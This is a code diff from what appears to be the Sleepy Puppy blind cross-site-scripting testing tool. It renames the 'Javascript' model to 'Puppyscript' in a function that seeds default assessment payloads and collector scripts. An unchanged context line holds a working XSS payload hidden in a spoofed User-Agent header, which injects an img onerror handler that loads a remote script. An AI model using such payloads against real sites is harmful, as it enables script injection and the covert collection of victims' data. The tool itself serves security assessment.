@@ -120,18 +120,18 @@ DEFAULT_PAYLOADS = [
     DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, False, False)  # noqa
 ]
 
-DefaultJavascript = namedtuple('DefaultJavascript', ['name', 'code', 'notes'])
+DefaultPuppyscript = namedtuple('DefaultPuppyscript', ['name', 'code', 'notes'])
 
 DEFAULT_JAVASCRIPTS = [
-    DefaultJavascript('Default', default_script,
+    DefaultPuppyscript('Default', default_script,
                       'Default  collects metadata for capture table including a screenshot'),
-    DefaultJavascript('Default Without Screenshot', default_without_screenshot,
+    DefaultPuppyscript('Default Without Screenshot', default_without_screenshot,
                       'Generating a screenshot can be CPU intensive and even in some cases cause browser instability, so for some assessments this may be a better option. '),
-    DefaultJavascript(
+    DefaultPuppyscript(
         'Alert Box', alert_box, 'Generates an alert box for notification purposes'),
-    DefaultJavascript(
+    DefaultPuppyscript(
         'Console Log', console_log, 'Log a message in the browser\'s console'),
-    DefaultJavascript('Generic Collector: IP Address', generic_collector,
+    DefaultPuppyscript('Generic Collector: IP Address', generic_collector,
                       'Example showing how you can create generic JavaScripts for collecting any text data you choose.  In this example we use ajax to determine IP address and record the value. ')
 ]
 
@@ -143,7 +143,7 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
     """
     from sleepypuppy.admin.assessment.models import Assessment
     from sleepypuppy.admin.payload.models import Payload
-    from sleepypuppy.admin.javascript.models import Javascript
+    from sleepypuppy.admin.puppyscript.models import Puppyscript
 
     assessment = Assessment.query.filter(Assessment.name == name).first()
     if assessment:
@@ -171,18 +171,18 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
                 db.session.add(payload)
                 db.session.commit()
 
-    existing_javascript = Javascript.query.filter(Javascript.id == 1).first()
+    existing_puppyscript = Puppyscript.query.filter(Puppyscript.id == 1).first()
 
-    if existing_javascript:
-        print("Javascripts already exists, exiting.")
+    if existing_puppyscript:
+        print("Puppyscripts already exists, exiting.")
     else:
-        for javascript in DEFAULT_JAVASCRIPTS:
-            javascript = Javascript(
-                name=javascript.name,
-                code=javascript.code,
-                notes=javascript.notes
+        for puppyscript in DEFAULT_JAVASCRIPTS:
+            puppyscript = Puppyscript(
+                name=puppyscript.name,
+                code=puppyscript.code,
+                notes=puppyscript.notes
             )
-            db.session.add(javascript)
+            db.session.add(puppyscript)
         db.session.commit()
 
 
